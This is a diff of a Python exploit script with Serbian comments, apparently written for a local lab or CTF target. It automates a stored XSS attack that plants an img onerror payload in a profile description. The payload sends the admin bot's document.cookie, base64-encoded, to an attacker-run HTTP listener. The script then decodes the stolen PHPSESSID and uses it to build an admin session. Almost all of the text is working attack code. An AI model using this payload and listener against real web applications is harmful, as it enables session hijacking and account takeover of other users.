@@ -32,41 +32,64 @@ USERNAME="user1"
 PASSWORD="pwned123"
 
 TARGET="http://localhost:8000"
-LHOST="172.17.0.1" # ovo vidi i docker container
+LHOST="192.168.65.254"  # Docker Desktop Windows: host.docker.internal
 LPORT=8001
 
 stolen_cookie = None
 
-PAYLOAD = f'<img src=nesto onerror=\'fetch("http://{LHOST}:{LPORT}/"+btoa(document.cookie))\'>'
-
 class CookieListener(BaseHTTPRequestHandler):
     def do_GET(self):
         global stolen_cookie
-        encoded = self.path.lstrip('/')
-        stolen_cookie = base64.b64decode(encoded).decode()
+        # path is "/<base64>" — split on first '/' to preserve any '/' inside base64
+        encoded = self.path.split('/', 1)[-1]
+        print(f"[+] Zahtev primljen: {self.path[:80]}")
+        try:
+            # btoa() always pads to len%4==0; formula adds 0,1,2 '=' as needed if stripped
+            stolen_cookie = base64.b64decode(encoded + '=' * (-len(encoded) % 4)).decode()
+        except Exception as e:
+            print(f"[-] base64 greska: {e} (path: {self.path})")
+            stolen_cookie = ""
         self.send_response(200)
         self.end_headers()
         threading.Thread(target=self.server.shutdown).start()
 
-session = requests.Session()
-session.post(f"{TARGET}/login.php", data={"username": USERNAME, "password": PASSWORD})
+    def log_message(self, format, *args):
+        pass  # BaseHTTPRequestHandler piše u stderr — gasi da ne zatrpa output
 
-session.post(f"{TARGET}/profile.php", data={"description": PAYLOAD})
+def steal_cookie():
+    global stolen_cookie
+    stolen_cookie = None
 
-server = HTTPServer(('0.0.0.0', LPORT), CookieListener)
-listener = threading.Thread(target=server.serve_forever)
-listener.start()
+    payload = f'<img src=x onerror=\'fetch("http://{LHOST}:{LPORT}/"+btoa(document.cookie))\'>'
 
-listener.join(timeout=65)
+    session = requests.Session()
+    session.post(f"{TARGET}/login.php", data={"username": USERNAME, "password": PASSWORD})
 
-if not stolen_cookie:
-    print("no cookie arrived")
-    exit(1)
+    session.post(f"{TARGET}/profile.php", data={"description": payload})
+    print(f"[*] XSS payload upisan. Listener na {LHOST}:{LPORT}")
+    print(f"[*] Cekamo admin bota (cron */1 * * * *)... timeout 130s")
 
-cookie_dict = dict(p.split('=', 1) for p in stolen_cookie.split(';'))
-phpsessid = cookie_dict.get('PHPSESSID')
+    server = HTTPServer(('0.0.0.0', LPORT), CookieListener)
+    listener = threading.Thread(target=server.serve_forever)
+    listener.start()
 
-admin_session = requests.Session()
-admin_session.cookies.set('PHPSESSID', phpsessid)
+    listener.join(timeout=130)
 
-print(f'cookie: {stolen_cookie}')
+    if listener.is_alive():
+        server.shutdown()
+
+    if not stolen_cookie:
+        print("no cookie arrived")
+        exit(1)
+
+    cookie_dict = dict(p.strip().split('=', 1) for p in stolen_cookie.split(';') if '=' in p)
+    phpsessid = cookie_dict.get('PHPSESSID')
+
+    admin_session = requests.Session()
+    admin_session.cookies.set('PHPSESSID', phpsessid)
+
+    print(f'cookie: {stolen_cookie}')
+    return phpsessid
+
+if __name__ == "__main__":
+    steal_cookie()
